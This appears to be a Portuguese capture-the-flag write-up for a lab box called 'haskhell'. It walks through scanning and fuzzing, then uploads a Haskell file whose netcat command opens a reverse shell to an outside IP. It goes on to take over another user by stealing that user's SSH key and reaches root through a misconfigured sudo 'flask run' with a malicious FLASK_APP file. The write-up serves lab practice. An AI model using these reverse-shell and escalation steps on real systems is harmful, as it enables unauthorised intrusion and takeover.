@@ -1,0 +1,52 @@
+rustscan:
+
+Open 10.64.175.213:22
+Open 10.64.175.213:5001
+
+
+nmap:
+
+fuzzing:
+
+  /homework1                                   200     1161B     Homework 1                         
+  /submit                                      200     237B      Submit homework   
+
+pagina de submit aceita apenas arquivos .hs HASKELL
+então o que eu fiz foi simplesmente subir uma shell em haskell:
+
+
+import System.Process
+
+main = do
+        callComand "busybox nc 192.168.200.114 1337 -e /bin/bash"
+
+
+ao enviar pro servidor no diretório /submit ganhei acesso e peguei a flag de usuário
+
+
+escalando para o usuário prof
+podia ler o arquivo .ssh e peguei a id_rsa dele e usei ela pra escalar pro usuário prof
+
+VIRANDO ROOT:
+
+sudo -l
+
+Matching Defaults entries for prof on haskhell: env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User prof may run the following commands on haskhell: (root) NOPASSWD: /usr/bin/flask run
+
+env_keep+=FLASK_APP
+e
+(root) NOPASSWD: /usr/bin/flask run
+
+FLASK_APP permite que eu carrego um arquivo em python para fazer uma chamada de shell
+
+eu fiz esse arquivo:
+
+--- shell---
+import os
+os.system("/bin/bash")
+---fim da shell---
+
+export FLASK_APP=shell.py
+sudo -u root /usr/bin/flask run
+virei root e peguei a flag do root!
+
